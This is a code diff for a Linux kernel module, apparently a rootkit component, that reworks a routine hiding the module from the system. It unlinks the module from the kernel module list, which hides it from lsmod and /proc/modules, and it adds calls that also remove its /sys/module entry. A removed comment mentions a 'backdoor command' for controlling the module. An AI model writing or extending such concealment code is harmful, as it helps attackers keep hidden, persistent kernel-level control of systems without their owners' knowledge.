@@ -10,31 +10,30 @@
 // http://isis.poly.edu/kulesh/stuff/src/klist/ - kernel lists explained
 
 static struct list_head *prev;	// The entry before our module in the kernel modules list
+static bool started = false;
 
 
 // Additional things to hide:
 	// The file in the /sys/module/ folder
-int __init moduleHide_init(void) {
+int moduleHide_start(void) {
+   if (started) return 0;
 	// Removes module structure from kernel module list structure, which in turn hides it from 
 	// /proc/modules and lsmod.
 	// While it is absent form the list, the module can't be uninstalled anymore.
 	prev = THIS_MODULE->list.prev;
 	list_del(&THIS_MODULE->list);
+   // Hide from /sys/module
+   kobject_del(&THIS_MODULE->mkobj.kobj);
+   list_del(&THIS_MODULE->mkobj.kobj.entry); 
+   started = true;
 
 	return 0;
 }
 
-// Maybe change this into a close module command rather than a show module command?
-// Or at least have the option - if we have the module hiding by default, there is no point
-// in calling rmmod module.ko, this would require us to show it first. Might as well just
-// have a direct backdoor command to kill the module.
-// If we do this, then the below function (exit) can be called on that command instead.
-void showModule(void) {
+void moduleHide_stop(void) {
+   if (!started) return;
 	list_add(&THIS_MODULE->list, prev);
-}
-
-// PREREQUISITE: showModule();
-void __exit moduleHide_exit(void) {
+   started = false;
 }
 
 
